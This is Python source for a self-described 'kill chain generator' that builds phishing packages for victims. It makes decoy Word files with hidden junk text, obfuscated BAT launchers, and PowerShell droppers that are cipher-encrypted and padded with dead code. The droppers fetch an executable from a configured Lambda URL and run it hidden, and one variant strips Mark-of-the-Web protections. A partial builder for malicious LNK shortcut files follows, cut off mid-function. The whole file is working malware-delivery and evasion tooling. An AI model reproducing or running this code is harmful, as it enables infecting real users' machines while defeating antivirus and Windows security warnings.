#!/usr/bin/env python3
"""
exam-gen: Automated kill chain generator for Linux.
Produces unique Word (.zip) and PDF (.zip) packages per variant folder.

Config via environment variables (or .env file next to this script):
  LAMBDA_URL        — Lambda Function URL for payload delivery
  API_KEY           — X-Api-Key header value
  TARGET_FILENAME   — Downloaded file name on victim (default: cat.exe)
  VARIANTS_DIR      — Path to variant folders (default: ./variants)
  OUTPUT_DIR        — Path for output ZIPs     (default: ./output)
  DELIVERY_METHOD   — webclient (default) or base64_recycle (MOTW bypass)
"""

import base64
import io
import os
import random
import shutil
import string
import struct
import subprocess
import sys
import tempfile
import zipfile

from docx import Document
from docx.shared import Pt, RGBColor

import pycdlib

# ── Try pylnk3, fall back to manual binary builder ──────────────────
try:
    import pylnk3
    HAS_PYLNK3 = True
except ImportError:
    HAS_PYLNK3 = False

# ====================================================================
#  CONFIG — loaded from env / .env file
# ====================================================================

def _load_dotenv():
    """Load .env file from script directory (simple key=value, no shell expansion)."""
    env_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '.env')
    if not os.path.isfile(env_path):
        return
    with open(env_path, encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if '=' not in line:
                continue
            key, _, value = line.partition('=')
            key = key.strip()
            value = value.strip().strip("'").strip('"')
            os.environ.setdefault(key, value)

_load_dotenv()

LAMBDA_URL       = os.environ.get('LAMBDA_URL', '')
API_KEY          = os.environ.get('API_KEY', '')
TARGET_FILENAME  = os.environ.get('TARGET_FILENAME', 'cat.exe')
VARIANTS_DIR     = os.environ.get('VARIANTS_DIR', './variants')
OUTPUT_DIR       = os.environ.get('OUTPUT_DIR', './output')
DELIVERY_METHOD  = os.environ.get('DELIVERY_METHOD', 'webclient')  # webclient | base64_recycle
LNK_BYPASS       = os.environ.get('LNK_BYPASS', '')               # non-empty = direct BAT exec (no start /min)
JUNK_CODE        = os.environ.get('JUNK_CODE', '')                # non-empty = inject dead-code functions/vars

# ====================================================================
#  CONSTANTS
# ====================================================================

CIPHER_ALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -"!@_.$()[]{}:;/,=#+'
CIPHER_CODE_CHARS = list(string.digits + string.ascii_lowercase)  # 0-9 a-z

WORD_POOL = [
    # Windows API / Kernel style
    'NtQueryObj', 'ZwAllocMem', 'RtlInitStr', 'LdrLoadDll', 'CsrClient',
    'KiDispatch', 'ObRefByHnd', 'PsGetProc', 'MmMapView', 'IoCallDrv',
    'SeAccessChk', 'CmQueryKey', 'ExAllocPool', 'KeWaitObj', 'HalDispTbl',
    'NtOpenProc', 'ZwWriteMem', 'RtlCopyMem', 'LdrGetProc', 'CsrCapture',
    'KiUserApc', 'ObDerefObj', 'PsLookup', 'MmSecure', 'IoAllocIrp',
    # Hex-junk style
    'x4f2a', 'b7e9c', 'd3f1a', 'a8c4e', 'f0b2d', 'e6a9f',
    'c1d7b', 'x9e3f', 'b2a6c', 'd8f4e', 'a0c7b', 'f3e1d',
    'x7b5a', 'c9d2f', 'e4a8b', 'b1f6c', 'd5e0a', 'a3c9f',
    'x2d8b', 'f7a1c', 'c4e6d', 'b9f3a', 'd0a5e', 'e1c8f',
    'x6f4b', 'a5d9c', 'f2b7e', 'c8e3a', 'd7a0f', 'b4c1d',
]

FILLER_WORDS = [
    'the', 'be', 'to', 'of', 'and', 'a', 'in', 'that', 'have', 'I',
    'it', 'for', 'not', 'on', 'with', 'he', 'as', 'you', 'do', 'at',
    'this', 'but', 'his', 'by', 'from', 'they', 'we', 'her', 'she', 'or',
    'an', 'will', 'my', 'all', 'would', 'there', 'their', 'what', 'so',
    'if', 'about', 'who', 'get', 'which', 'go', 'me', 'when', 'make',
    'can', 'like', 'time', 'just', 'him', 'know', 'take', 'people', 'into',
    'year', 'your', 'good', 'some', 'could', 'them', 'see', 'other', 'than',
    'then', 'now', 'look', 'only', 'come', 'its', 'over', 'think', 'also',
    'back', 'after', 'use', 'two', 'how', 'our', 'work', 'first', 'well',
    'way', 'even', 'new', 'want', 'because', 'any', 'these', 'give', 'day',
    'most', 'us', 'great', 'between', 'need', 'large', 'must', 'home',
    'big', 'long', 'since', 'right', 'still', 'find', 'here', 'thing',
    'many', 'help', 'where', 'does', 'part', 'every', 'place', 'made',
    'after', 'keep', 'should', 'call', 'world', 'never', 'much', 'old',
    'number', 'same', 'tell', 'real', 'leave', 'try', 'last', 'school',
    'start', 'city', 'run', 'hand', 'high', 'small', 'end', 'put',
    'house', 'read', 'own', 'point', 'move', 'close', 'life', 'might',
    'next', 'open', 'seem', 'together', 'group', 'head', 'turn', 'bring',
    'morning', 'office', 'report', 'meeting', 'please', 'thank', 'update',
    'schedule', 'email', 'review', 'project', 'today', 'tomorrow', 'week',
    'month', 'budget', 'team', 'company', 'department', 'manager', 'client',
    'order', 'delivery', 'invoice', 'payment', 'contract', 'agreement',
    'document', 'proposal', 'response', 'request', 'available', 'confirm',
    'address', 'phone', 'message', 'question', 'answer', 'information',
]

REM_POOL = [
    'REM System diagnostic module v{v}',
    'REM Checking system integrity...',
    'REM Initializing update service...',
    'REM Configuration loader v{v1}',
    'REM Verifying digital signatures...',
    'REM Module sync in progress...',
    'REM Runtime environment check...',
    'REM Service heartbeat monitor',
]


# ====================================================================
#  HELPER: random variable name (port of Get-RandomVarName)
# ====================================================================

def random_var_name():
    w1 = random.choice(WORD_POOL)
    w2 = random.choice(WORD_POOL)
    num = random.randint(10, 99)
    return f'{w1}{w2}{num}'


def random_short_name():
    """Generate a random 2-3 letter filename (lowercase)."""
    length = random.randint(2, 3)
    return ''.join(random.choices(string.ascii_lowercase, k=length))


# ====================================================================
#  CIPHER MAP (port of sk.ps1 cipher generation)
# ====================================================================

def generate_cipher_map():
    """Return (encrypt_map, decrypt_map) — each char -> unique 2-char code."""
    encrypt_map = {}
    decrypt_map = {}
    for ch in CIPHER_ALPHABET:
        while True:
            code = random.choice(CIPHER_CODE_CHARS) + random.choice(CIPHER_CODE_CHARS)
            if code not in decrypt_map:
                break
        encrypt_map[ch] = code
        decrypt_map[code] = ch
    return encrypt_map, decrypt_map


def encrypt_string(text, encrypt_map):
    result = []
    for ch in text:
        if ch in encrypt_map:
            result.append(encrypt_map[ch])
        else:
            result.append(ch)
    return ''.join(result)


# ====================================================================
#  PS1 DROPPER GENERATOR
# ====================================================================

def generate_ps1(encrypt_map, decrypt_map):
    """Build the full PS1 artifact (dropper with cipher wrapper)."""

    # ── random placeholder tags (unique per variant) ──
    tag_url = '##' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 8))) + '##'
    tag_fn = '##' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 8))) + '##'

    # ── random variable names for the inner template ──
    dv1 = random_var_name()  # tempPath
    dv2 = random_var_name()  # webClient
    dv3 = random_var_name()  # url
    dv4 = random_var_name()  # filename
    dv5 = random_var_name()  # fullPath

    # 9-line dropper template (WebClient + X-Api-Key for Lambda)
    script_template = (
        f'[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12\n'
        f'${dv1} = [system.io.path]::gettemppath()\n'
        f'${dv2} = new-object system.net.webclient\n'
        f'${dv2}.headers.add("x-api-key", "{API_KEY}")\n'
        f'${dv3} = "{tag_url}"\n'
        f'${dv4} = "{tag_fn}"\n'
        f'${dv5} = join-path ${dv1} ${dv4}\n'
        f'${dv2}.downloadfile(${dv3}, ${dv5})\n'
        f'start-process -filepath ${dv5} -windowstyle hidden'
    )

    # ── encode URL & filename as Base64 ──
    b64_url = base64.b64encode(LAMBDA_URL.encode('utf-8')).decode('ascii')
    b64_filename = base64.b64encode(TARGET_FILENAME.encode('utf-8')).decode('ascii')

    # ── encrypt the template body ──
    encrypted_body = encrypt_string(script_template, encrypt_map)
    encrypted_body = encrypted_body.replace("'", "''")  # escape for PS1 single-quoted string

    # ── random variable names for the wrapper ──
    var_url = random_var_name()
    var_filename = random_var_name()
    var_enc_body = random_var_name()
    var_dec_map = random_var_name()
    var_func = random_var_name()
    var_decoded_url = random_var_name()
    var_decoded_fn = random_var_name()
    var_dec_script = random_var_name()
    var_final = random_var_name()

    # ── build the decryption map block ──
    # { and } go to end to avoid @{} block breakage
    normal_entries = []
    special_entries = []
    for code, ch in decrypt_map.items():
        entry = f"'{code}'='{ch}'"
        if ch in '{}':
            special_entries.append(entry)
        else:
            normal_entries.append(entry)
    all_entries = normal_entries + special_entries

    map_lines = []
    for i in range(0, len(all_entries), 10):
        chunk = all_entries[i:i + 10]
        map_lines.append('    ' + '; '.join(chunk) + '; ')
    map_block = '\n'.join(map_lines)

    # ── junk code blocks ──
    junk_funcs_block = ''
    junk_vars_block = ''
    if JUNK_CODE:
        funcs_text, func_names = _junk_ps1_functions()
        call_chain = _junk_ps1_call_chain(func_names)
        junk_funcs_block = funcs_text + '\n' + call_chain + '\n\n'
        junk_vars_block = '\n'.join(_junk_ps1_vars()) + '\n'

    # ── assemble final artifact ──
    artifact = (
        f"${var_url} = '{b64_url}'\n"
        f"${var_filename} = '{b64_filename}'\n"
        f"${var_enc_body} = '{encrypted_body}'\n"
        f"\n"
        f"{junk_vars_block}"
        f"${var_dec_map} = @{{\n"
        f"{map_block}\n"
        f"}}\n"
        f"\n"
        f"{junk_funcs_block}"
        f"function {var_func} {{\n"
        f"    param ([string]$InputString)\n"
        f"    $result = \"\"\n"
        f"    $i = 0\n"
        f"    while ($i -lt $InputString.Length) {{\n"
        f"        if ($i + 1 -lt $InputString.Length) {{\n"
        f"            $pair = $InputString.Substring($i, 2)\n"
        f"            if (${var_dec_map}.ContainsKey($pair)) {{\n"
        f"                $result += ${var_dec_map}[$pair]\n"
        f"                $i += 2\n"
        f"                continue\n"
        f"            }}\n"
        f"        }}\n"
        f"        $result += $InputString[$i]\n"
        f"        $i++\n"
        f"    }}\n"
        f"    return $result\n"
        f"}}\n"
        f"\n"
        f"${var_decoded_url} = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${var_url}))\n"
        f"${var_decoded_fn} = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${var_filename}))\n"
        f"${var_dec_script} = {var_func} -InputString ${var_enc_body}\n"
        f"${var_final} = ${var_dec_script} -replace '{tag_url}', ${var_decoded_url}\n"
        f"${var_final} = ${var_final} -replace '{tag_fn}', ${var_decoded_fn}\n"
        f"Invoke-Expression ${var_final}\n"
    )
    return artifact


def generate_ps1_recycle(encrypt_map, decrypt_map):
    """Build PS1 artifact: download via Lambda, base64 create, recycle bin MOTW bypass."""

    # ── random placeholder tags ──
    tag_url = '##' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 8))) + '##'
    tag_fn = '##' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 8))) + '##'

    # ── random variable names for inner template ──
    dv1 = random_var_name()  # tempPath
    dv2 = random_var_name()  # webClient
    dv3 = random_var_name()  # url
    dv4 = random_var_name()  # filename
    dv5 = random_var_name()  # fullPath
    dv6 = random_var_name()  # bytes
    dv7 = random_var_name()  # b64

    # Inner template: download + write ONLY (no start-process, no MOTW removal)
    # MOTW removal and execution are in the wrapper (unencrypted) for reliability
    script_template = (
        f'[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12\n'
        f'${dv1} = [system.io.path]::gettemppath()\n'
        f'${dv2} = new-object system.net.webclient\n'
        f'${dv2}.headers.add("x-api-key", "{API_KEY}")\n'
        f'${dv3} = "{tag_url}"\n'
        f'${dv4} = "{tag_fn}"\n'
        f'${dv5} = join-path ${dv1} ${dv4}\n'
        f'${dv6} = ${dv2}.downloaddata(${dv3})\n'
        f'${dv7} = [convert]::tobase64string(${dv6})\n'
        f'[io.file]::writeallbytes(${dv5}, [convert]::frombase64string(${dv7}))'
    )

    # ── encode URL & filename as Base64 ──
    b64_url = base64.b64encode(LAMBDA_URL.encode('utf-8')).decode('ascii')
    b64_filename = base64.b64encode(TARGET_FILENAME.encode('utf-8')).decode('ascii')

    # ── encrypt the template body ──
    encrypted_body = encrypt_string(script_template, encrypt_map)
    encrypted_body = encrypted_body.replace("'", "''")  # escape for PS1 single-quoted string

    # ── random variable names for wrapper ──
    var_url = random_var_name()
    var_filename = random_var_name()
    var_enc_body = random_var_name()
    var_dec_map = random_var_name()
    var_func = random_var_name()
    var_decoded_url = random_var_name()
    var_exec_path = random_var_name()
    var_decoded_fn = random_var_name()
    var_dec_script = random_var_name()
    var_final = random_var_name()

    # ── build decryption map block ──
    normal_entries = []
    special_entries = []
    for code, ch in decrypt_map.items():
        entry = f"'{code}'='{ch}'"
        if ch in '{}':
            special_entries.append(entry)
        else:
            normal_entries.append(entry)
    all_entries = normal_entries + special_entries

    map_lines = []
    for i in range(0, len(all_entries), 10):
        chunk = all_entries[i:i + 10]
        map_lines.append('    ' + '; '.join(chunk) + '; ')
    map_block = '\n'.join(map_lines)

    # ── junk code blocks ──
    junk_funcs_block = ''
    junk_vars_block = ''
    if JUNK_CODE:
        funcs_text, func_names = _junk_ps1_functions()
        call_chain = _junk_ps1_call_chain(func_names)
        junk_funcs_block = funcs_text + '\n' + call_chain + '\n\n'
        junk_vars_block = '\n'.join(_junk_ps1_vars()) + '\n'

    # ── assemble final artifact ──
    artifact = (
        f"${var_url} = '{b64_url}'\n"
        f"${var_filename} = '{b64_filename}'\n"
        f"${var_enc_body} = '{encrypted_body}'\n"
        f"\n"
        f"{junk_vars_block}"
        f"${var_dec_map} = @{{\n"
        f"{map_block}\n"
        f"}}\n"
        f"\n"
        f"{junk_funcs_block}"
        f"function {var_func} {{\n"
        f"    param ([string]$InputString)\n"
        f"    $result = \"\"\n"
        f"    $i = 0\n"
        f"    while ($i -lt $InputString.Length) {{\n"
        f"        if ($i + 1 -lt $InputString.Length) {{\n"
        f"            $pair = $InputString.Substring($i, 2)\n"
        f"            if (${var_dec_map}.ContainsKey($pair)) {{\n"
        f"                $result += ${var_dec_map}[$pair]\n"
        f"                $i += 2\n"
        f"                continue\n"
        f"            }}\n"
        f"        }}\n"
        f"        $result += $InputString[$i]\n"
        f"        $i++\n"
        f"    }}\n"
        f"    return $result\n"
        f"}}\n"
        f"\n"
        f"${var_decoded_url} = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${var_url}))\n"
        f"${var_decoded_fn} = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${var_filename}))\n"
        f"${var_dec_script} = {var_func} -InputString ${var_enc_body}\n"
        f"${var_final} = ${var_dec_script} -replace '{tag_url}', ${var_decoded_url}\n"
        f"${var_final} = ${var_final} -replace '{tag_fn}', ${var_decoded_fn}\n"
        f"Invoke-Expression ${var_final}\n"
        f"\n"
        f"${var_exec_path} = Join-Path ([System.IO.Path]::GetTempPath()) ${var_decoded_fn}\n"
        f"if (Test-Path ${var_exec_path}) {{\n"
        f"    Remove-Item -Path ${var_exec_path} -Stream Zone.Identifier -ErrorAction SilentlyContinue\n"
        f"    Unblock-File -Path ${var_exec_path} -ErrorAction SilentlyContinue\n"
        f"    $psi = New-Object System.Diagnostics.ProcessStartInfo\n"
        f"    $psi.FileName = ${var_exec_path}\n"
        f"    $psi.UseShellExecute = $false\n"
        f"    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden\n"
        f"    [System.Diagnostics.Process]::Start($psi) | Out-Null\n"
        f"}}\n"
    )
    return artifact


# ====================================================================
#  DOCX HASH MODIFICATION
# ====================================================================

def rehash_docx(docx_path):
    """Add invisible white 1pt random text to change the file hash."""
    doc = Document(docx_path)
    # 30-80 words + random numbers for maximum entropy
    count = random.randint(30, 80)
    parts = []
    for _ in range(count):
        if random.random() < 0.15:
            parts.append(str(random.randint(100, 999999)))
        else:
            parts.append(random.choice(FILLER_WORDS))
    text = ' '.join(parts)
    para = doc.add_paragraph()
    run = para.add_run(text)
    run.font.color.rgb = RGBColor(0xFF, 0xFF, 0xFF)
    run.font.size = Pt(1)
    doc.save(docx_path)


# ====================================================================
#  BAT OBFUSCATION (set-variable fragmentation)
# ====================================================================

def _junk_rems():
    pool = []
    for template in REM_POOL:
        line = template.format(
            v=f'{random.randint(1,9)}.{random.randint(0,9)}.{random.randint(0,9)}',
            v1=str(random.randint(1, 5)),
        )
        pool.append(line)
    random.shuffle(pool)
    return pool[:random.randint(3, 5)]


# ====================================================================
#  JUNK CODE GENERATORS (BAT + PS1)
# ====================================================================

def _rand_label():
    """Procedural BAT label: prefix+suffix, camelCase."""
    _prefixes = ['chk', 'init', 'get', 'set', 'run', 'log', 'sync', 'upd',
                 'cfg', 'sys', 'net', 'buf', 'reg', 'drv', 'svc']
    _suffixes = ['Data', 'Info', 'State', 'Block', 'Node', 'Item', 'Entry',
                 'Value', 'Flag', 'Code', 'Path', 'Mode', 'Size', 'Port', 'Key']
    return random.choice(_prefixes) + random.choice(_suffixes)


def _rand_ps1_funcname():
    """Procedural PS1 function name — same style as real script variables."""
    return random_var_name()


def _junk_bat_set_lines():
    """Dead SET lines to mix with real set_lines before shuffle."""
    lines = []
    for _ in range(random.randint(2, 4)):
        vn = ''.join(random.choices(string.ascii_lowercase, k=random.randint(2, 4)))
        val = random.choice([
            str(random.randint(0, 65535)),
            ''.join(random.choices(string.hexdigits[:16], k=random.randint(4, 8))),
            f'%SystemRoot%\\System32\\{random.choice(["drivers", "config", "wbem"])}',
        ])
        lines.append(f'set "{vn}={val}"')
    return lines


def _junk_bat_blocks():
    """Innocuous BAT constructs — pure arithmetic, string ops, flow control."""
    blocks = []

    def _set_arithmetic():
        vn = _rand_label()
        a = random.randint(1, 255)
        b = random.randint(1, 255)
        op = random.choice(['+', '-', '*'])
        return [f'set /a {vn}={a} {op} {b}']

    def _set_concat():
        vn1 = _rand_label()
        vn2 = _rand_label()
        w1 = random.choice(FILLER_WORDS)
        w2 = random.choice(FILLER_WORDS)
        return [f'set "{vn1}={w1}"', f'set "{vn2}=%{vn1}%{w2}"']

    def _if_exist_temp():
        dirs = ['%TEMP%', '%USERPROFILE%', '%APPDATA%', '%LOCALAPPDATA%']
        d = random.choice(dirs)
        vn = _rand_label()
        return [f'if exist "{d}" (set "{vn}=1") else (set "{vn}=0")']

    def _nop_cmd():
        return [random.choice(['type nul > nul', 'ver >nul', '(call )', 'cd .'])]

    def _errorlevel_set():
        vn = _rand_label()
        val = random.choice(['ready', 'ok', 'true', '1', 'done'])
        return [f'if %errorlevel% equ 0 (set "{vn}={val}")']

    def _if_defined():
        vn = _rand_label()
        vn2 = _rand_label()
        return [f'if defined {vn} (set "{vn2}=1")']

    all_patterns = [_set_arithmetic, _set_concat, _if_exist_temp,
                    _nop_cmd, _errorlevel_set, _if_defined]
    chosen = random.sample(all_patterns, k=random.randint(3, 5))
    for gen in chosen:
        blocks.extend(gen())
    random.shuffle(blocks)
    return blocks


def _junk_ps1_functions():
    """Generate 2-4 junk PS1 functions with 8 body patterns.

    Returns (block_str, func_names).
    """
    funcs = []
    func_names = []
    count = random.randint(2, 4)

    def _body_math_chain(name, v1, v2):
        a = random.randint(10, 500)
        b = random.randint(2, 20)
        return (
            f"function {name} {{\n"
            f"    ${v1} = [math]::Round([math]::Sqrt({a}), {random.randint(1, 4)})\n"
            f"    ${v2} = [math]::Max(${v1}, {b})\n"
            f"    return ${v2}\n"
            f"}}\n"
        )

    def _body_path_combine(name, v1, v2):
        subdir = random.choice(['Logs', 'Cache', 'Temp', 'Config', 'Data'])
        return (
            f"function {name} {{\n"
            f"    ${v1} = [IO.Path]::Combine($env:TEMP, '{subdir}')\n"
            f"    ${v2} = Test-Path ${v1}\n"
            f"    return ${v2}\n"
            f"}}\n"
        )

    def _body_string_format(name, v1, v2):
        word = random.choice(FILLER_WORDS)
        pad = random.randint(8, 20)
        return (
            f"function {name} {{\n"
            f"    ${v1} = '{word}'.PadLeft({pad}, '0')\n"
            f"    ${v2} = ${v1}.ToUpper().Trim()\n"
            f"    return ${v2}.Length\n"
            f"}}\n"
        )

    def _body_timespan_calc(name, v1, v2):
        mins = random.randint(5, 300)
        return (
            f"function {name} {{\n"
            f"    ${v1} = [TimeSpan]::FromMinutes({mins})\n"
            f"    ${v2} = ${v1}.TotalSeconds\n"
            f"    return ${v2}\n"
            f"}}\n"
        )

    def _body_string_split_join(name, v1, v2):
        words = ' '.join(random.choices(FILLER_WORDS, k=random.randint(3, 6)))
        return (
            f"function {name} {{\n"
            f"    ${v1} = '{words}' -split '\\s+' | ForEach-Object {{ $_.Substring(0,1) }}\n"
            f"    ${v2} = ${v1} -join '-'\n"
            f"    return ${v2}\n"
            f"}}\n"
        )

    def _body_datetime_math(name, v1, v2):
        mins = random.randint(1, 120)
        fmt = random.choice(["'yyyyMMdd'", "'HHmmss'", "'yyyy-MM-dd'"])
        return (
            f"function {name} {{\n"
            f"    ${v1} = [datetime]::Now.AddMinutes(-{mins})\n"
            f"    ${v2} = ${v1}.ToString({fmt})\n"
            f"    return ${v2}\n"
            f"}}\n"
        )

    def _body_array_reduce(name, v1, v2):
        nums = ', '.join(str(random.randint(1, 100)) for _ in range(random.randint(4, 8)))
        return (
            f"function {name} {{\n"
            f"    ${v1} = @({nums})\n"
            f"    ${v2} = (${v1} | Measure-Object -Sum).Sum\n"
            f"    return ${v2}\n"
            f"}}\n"
        )

    def _body_hashtable_merge(name, v1, v2):
        k1 = random_var_name()
        k2 = random_var_name()
        n1 = random.randint(0, 999)
        n2 = random.randint(0, 999)
        return (
            f"function {name} {{\n"
            f"    ${v1} = @{{ '{k1}' = {n1} }}\n"
            f"    ${v2} = @{{ '{k2}' = {n2} }}\n"
            f"    $merged = ${v1} + ${v2}\n"
            f"    return $merged.Count\n"
            f"}}\n"
        )

    body_patterns = [
        _body_math_chain, _body_path_combine, _body_string_format,
        _body_timespan_calc, _body_string_split_join, _body_datetime_math,
        _body_array_reduce, _body_hashtable_merge,
    ]
    chosen = random.sample(body_patterns, k=count)
    for pat in chosen:
        name = _rand_ps1_funcname()
        while name in func_names:
            name = _rand_ps1_funcname()
        func_names.append(name)
        v1 = random_var_name()
        v2 = random_var_name()
        funcs.append(pat(name, v1, v2))

    block_str = '\n'.join(funcs)
    return block_str, func_names


def _junk_ps1_call_chain(func_names):
    """Call chain: each junk function is called, results feed into each other."""
    if not func_names:
        return ''
    lines = []
    junk_vars = []
    for fname in func_names:
        vn = random_var_name()
        junk_vars.append(vn)
        lines.append(f"${vn} = {fname}")

    # Combine results so static analysis sees live data flow
    if len(junk_vars) >= 2:
        combine_var = random_var_name()
        refs = ' + '.join(f'[string]${v}' for v in junk_vars[:3])
        lines.append(f"${combine_var} = {refs}")
    return '\n'.join(lines)


def _junk_ps1_vars():
    """Dead PS1 variable assignments — 10+ value patterns, some cross-referencing."""
    all_patterns = [
        lambda: "[guid]::NewGuid().ToString().Substring(0,8)",
        lambda: f"(Get-Date).Ticks % {random.randint(1000, 99999)}",
        lambda: f"'{random_var_name()}' -replace '{random.choice(string.ascii_lowercase)}','{random.choice(string.ascii_uppercase)}'",
        lambda: "[System.IO.Path]::GetRandomFileName()",
        lambda: f"[math]::Abs({random.randint(-9999, 9999)})",
        lambda: f"[math]::Round({random.uniform(1, 1000):.4f}, {random.randint(1, 3)})",
        lambda: f"'{random.choice(FILLER_WORDS)}'.Length + {random.randint(1, 100)}",
        lambda: f"@({', '.join(str(random.randint(0, 255)) for _ in range(random.randint(3, 6)))})[{random.randint(0, 2)}]",
        lambda: f"[int]('0x' + '{random.randint(16, 255):02x}')",
        lambda: f"0x{random.randint(0, 0xFFFF):04x}",
        lambda: f"@({', '.join(str(random.randint(0, 255)) for _ in range(random.randint(3, 6)))})",
        lambda: f"'{random.choice(FILLER_WORDS)}'.PadLeft({random.randint(8, 16)}, ' ')",
    ]

    count = random.randint(4, 7)
    chosen = random.choices(all_patterns, k=count)
    lines = []
    prev_vars = []
    for pat in chosen:
        vn = random_var_name()
        lines.append(f"${vn} = {pat()}")
        prev_vars.append(vn)

    # Cross-references between junk vars
    if len(prev_vars) >= 2:
        for _ in range(random.randint(1, 2)):
            ref1, ref2 = random.sample(prev_vars, 2)
            vn = random_var_name()
            lines.append(f"${vn} = [string]${ref1} + [string]${ref2}")
            prev_vars.append(vn)

    return lines


def generate_bat(decoy_name, ps1_name='ser.ps1'):
    """Build obfuscated BAT content."""
    ps_fragments = [('pow', 'a'), ('ersh', 'b'), ('ell', 'c')]
    arg_fragments = [
        ('-NoP', 'd'), ('rofile', 'e'),
        (' -Ex', 'f'), ('ecutionP', 'g'), ('olicy Bypass', 'h'),
        (' -Wi', 'i'), ('ndowStyle Hidden', 'j'),
    ]
    all_frags = ps_fragments + arg_fragments
    set_lines = [f'set "{var}={val}"' for val, var in all_frags]
    if JUNK_CODE:
        set_lines.extend(_junk_bat_set_lines())
    random.shuffle(set_lines)

    bat_lines = ['@echo off', 'cd /d "%~dp0"']
    rems = _junk_rems()
    rem_i = 0
    for sl in set_lines:
        if rem_i < len(rems) and random.random() > 0.4:
            bat_lines.append(rems[rem_i])
            rem_i += 1
        bat_lines.append(sl)
    while rem_i < len(rems):
        bat_lines.append(rems[rem_i])
        rem_i += 1

    # ── junk dead-code blocks ──
    if JUNK_CODE:
        bat_lines.append('')
        bat_lines.extend(_junk_bat_blocks())

    ps_exe = '%' + '%%'.join(v for _, v in ps_fragments) + '%'
    ps_args = '%' + '%%'.join(v for _, v in arg_fragments) + '%'
    bat_lines.append('')
    bat_lines.append(f'start {decoy_name}')
    bat_lines.append(f'{ps_exe}.exe {ps_args} -File {ps1_name}')
    return '\r\n'.join(bat_lines) + '\r\n'


# ====================================================================
#  LNK CREATION (pylnk3 or raw binary)
# ====================================================================

def _build_lnk_binary(target, arguments, icon_location, icon_index, working_dir, window_style):
    """Build a minimal .lnk (Shell Link Binary) file manually.
    Follows [MS-SHLLINK] specification.
    """
    buf = io.BytesIO()

    # ── ShellLinkHeader (76 bytes) ──
    header_size = 0x0000004C
    clsid = b'\x01\x14\x02\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46'

    # LinkFlags
    link_flags = (
        0x00000001 |  # HasLinkTargetIDList
        0x00000002 |  # HasLinkInfo
        0x00000008 |  # HasRelativePath
        0x00000020 |  # HasArguments
        0x00000040 |  # HasIconLocation
        0x00000080    # IsUnicode
    )
    if working_dir:
        link_flags |= 0x00000010  # HasWorkingDir
    file_attributes = 0x00000020  # FILE_ATTRIBUTE_ARCHIVE
    creation_time = 0
    access_time = 0
    write_time = 0
    file_size = 0
    show_command = window_style  # SW_SHOWMINNOACTIVE = 7
    hot_key = 0
    reserved1 = 0
    reserved2 = 0
    reserved3 = 0

    buf.write(struct.pack('<I', header_size))
    buf.write(clsid)
    buf.write(struct.pack('<I', link_flags))
    buf.write(struct.pack('<I', file_attributes))
    buf.write(struct.pack('<Q', creation_time))
    buf.write(struct.pack('<Q', access_time))
    buf.write(struct.pack('<Q', write_time))
    buf.write(struct.pack('<I', file_size))
    buf.write(struct.pack('<I', icon_index))
    buf.write(struct.pack('<I', show_command))
    buf.write(struct.pack('<H', hot_key))
    buf.write(struct.pack('<H', reserved1))
    buf.write(struct.pack('<I', reserved2))
    buf.write(struct.pack('<I', reserved3))

    # ── LinkTargetIDList ──
    # Build a minimal IDList pointing to cmd.exe via CLSID for "My Computer"
    # Simpler approach: just build a basic item ID for the target
    def _make_simple_pidl(path_str):
        """Create a minimal IDList with a single file-reference item."""
        # Item: type=0x32 (file), short name
        short_name = os.path.basename(path_str).encode('ascii') + b'\x00'
        # ItemID: size(2) + type(1) + unknown(1) + filesize(4) + moddate(4) +
        #         modtime(2) + attrs(2) + shortname + padding + unicode_name
        item_data = b'\x00' * 1  # sort index
        item_data += b'\x32'     # type: file
        item_data += b'\x00' * 10  # file size + dates
        short_padded = short_name
        if len(short_padded) % 2 == 0:
            short_padded += b'\x00'
        item_data += short_padded
        item_size = 2 + len(item_data)
        item = struct.pack('<H', item_size) + item_data

        # CLSID for My Computer: 20D04FE0-3AEA-1069-A2D8-08002B30309D
        clsid_item_data = b'\x1f\x50'  # type: GUID
        clsid_item_data += bytes([
            0xe0, 0x4f, 0xd0, 0x20, 0xea, 0x3a, 0x69, 0x10,
            0xa2, 0xd8, 0x08, 0x00, 0x2b, 0x30, 0x30, 0x9d
        ])
        clsid_size = 2 + len(clsid_item_data)
        clsid_item = struct.pack('<H', clsid_size) + clsid_item_data

        # Drive item for C:
        drive_data = b'/'  # type: drive
        drive_data += b'C:\\\x00'
        drive_size = 2 + len(drive_data)
        drive_item = struct.pack('<H', drive_size) + drive_data

        # Combine: CLSID_item + drive_item + file_item + terminator
        id_list = clsid_item + drive_item + item + struct.pack('<H', 0)
        return struct.pack('<H', len(id_list)) + id_list

    pidl = _make_simple_pidl(target)
    buf.write(pidl)

    # ── LinkInfo ──
    # Minimal LinkInfo pointing to a local volume
    target_bytes = target.encode('ascii') + b'\x00'
    link_info_hdr_size = 28
    vol_id_offset = 28
    local_base_offset_pos = 16

    # VolumeID: minimal
    vol_id_data = b'\x00\x00\x00\x00'  # drive type
    vol_id_data += b'\x00\x00\x00\x00'  # serial
    vol_id_data += b'\x00\x00\x00\x00'  # label offset
    vol_id_label = b'\x00'
    vol_id_body = struct.pack('<I', 16 + len(vol_id_label)) + vol_id_data + vol_id_label
    vol_id_size = len(vol_id_body)

    local_base_path_offset = vol_id_offset + vol_id_size
    common_suffix_offset = local_base_path_offset + len(target_bytes)

    link_info_size = common_suffix_offset + 1  # +1 for null terminator
    link_info_flags = 0x00000001  # VolumeIDAndLocalBasePath

    li = io.BytesIO()
    li.write(struct.pack('<I', link_info_size))
    li.write(struct.pack('<I', link_info_hdr_size))
    li.write(struct.pack('<I', link_info_flags))
    li.write(struct.pack('<I', vol_id_offset))
    li.write(struct.pack('<I', local_base_path_offset))
